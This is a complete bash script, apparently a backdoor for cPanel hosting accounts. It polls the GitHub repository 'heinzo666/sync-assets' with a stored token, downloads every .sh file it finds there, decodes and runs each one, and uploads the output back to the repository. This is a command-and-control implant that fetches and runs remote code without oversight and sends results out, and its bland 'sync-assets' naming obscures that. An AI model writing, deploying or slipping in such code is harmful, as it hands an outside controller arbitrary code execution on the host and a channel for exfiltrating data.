#!/bin/bash
# hgboot.sh — cPanel GitHub-polling agent bootstrap (single-file, no args).
set -u
T="${GHT:-}"
[ -z "$T" ] && T=$(cat "$HOME/.ghtok_hg" 2>/dev/null)
[ -z "$T" ] && exit 0
API=https://api.github.com/repos/heinzo666/sync-assets/contents
D="$HOME/.hgq"; R="$D/r.$$"; mkdir -p "$D" "$R"; touch "$D/done"
f(){ timeout 25 curl -fsSL -H "Authorization: Bearer $T" -H 'Accept: application/vnd.github+json' "$1"; }
putb64(){ # $1 path $2 b64payload $3 msg
 printf '{"message":"%s","content":"%s"}' "$3" "$2" > "$D/p.json"
 timeout 30 curl -fsSL -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
   --data-binary @"$D/p.json" "$API/$1" -o /dev/null || true
}
LIST=$(f "$API/lab/hgin?ref=main&t=$RANDOM") || exit 0
NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
for N in $NAMES; do
  grep -qxF "$N" "$D/done" 2>/dev/null && continue
  RAW=$(f "$API/lab/hgin/$N?ref=main")
  B64=$(printf '%s' "$RAW" | sed 's/.*"content": *"//; s/".*//' | tr -d '\n ')
  [ -z "$B64" ] && { echo "$N" >> "$D/done"; continue; }
  printf '%s' "$B64" | base64 -d > "$R/$N" 2>/dev/null
  SZ=$(wc -c < "$R/$N"); chmod +x "$R/$N"
  OUT=$(/bin/bash "$R/$N" 2>&1); RC=$?
  [ ${#OUT} -lt 3 ] && { grep -vxF "$N" "$D/done" > "$D/done.tmp" || true; mv "$D/done.tmp" "$D/done"; }
  { echo "RC=$RC SZ=$SZ"; echo "$OUT"; } > "$R/o.txt"
  OB64=$(base64 -w0 < "$R/o.txt")
  putb64 "lab/hgout/${N%.sh}.json" "$OB64" "result ${N}"
  echo "$N" >> "$D/done"
done
exit 0
rm -rf "$R"
exit 0
